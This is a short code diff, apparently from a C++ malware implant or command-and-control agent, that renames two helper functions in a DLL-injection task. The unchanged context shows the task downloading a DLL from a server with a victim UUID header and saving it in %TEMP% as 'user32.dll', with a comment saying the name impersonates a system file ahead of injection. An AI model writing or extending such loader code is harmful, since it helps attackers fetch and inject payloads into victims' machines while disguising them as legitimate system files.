@@ -9,13 +9,13 @@ namespace Task
 
         // Set the DLL file path to inject
         std::wstring wDllDestName = L"user32.dll"; // Impersonate the file name.
-        std::wstring wDllDest = System::Env::GetStrings(pState->pProcs, L"%TEMP%") + L"\\" + wDllDestName;
+        std::wstring wDllDest = System::Env::EnvStringsGet(pState->pProcs, L"%TEMP%") + L"\\" + wDllDestName;
         size_t dwDllDestSize = (wDllDest.size() + 1) * sizeof(wchar_t);
 
         std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
 
         // Download a DLL file
-        if (!System::Http::DownloadFile(
+        if (!System::Http::FileDownload(
             pState->pProcs,
             pState->pCrypt,
             pState->hConnect,
